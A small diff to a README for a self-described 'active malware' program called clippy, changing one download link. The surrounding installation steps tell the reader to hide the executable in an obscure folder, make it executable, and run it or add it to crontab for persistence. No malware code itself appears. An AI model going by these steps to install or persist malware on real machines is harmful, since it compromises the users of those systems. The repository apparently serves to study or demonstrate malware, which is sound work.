@@ -6,7 +6,7 @@ Please note that this *is* active malware and so take care if testing it on your
 
 ## Installation instructions
 
-1. Download the [clippy](../../blop/clippy) executable file and save it somewhere obscure (like Application Support!)
+1. Download the [clippy](../../blop/master/clippy) executable file and save it somewhere obscure (like Application Support!)
 2. Add executable permissions to it with `chmod +x ./clippy`
 3. Run it (or manually add it to `crontab`. It's up to you.) You can exit with `^C` after a few seconds.
 4. Enjoy.
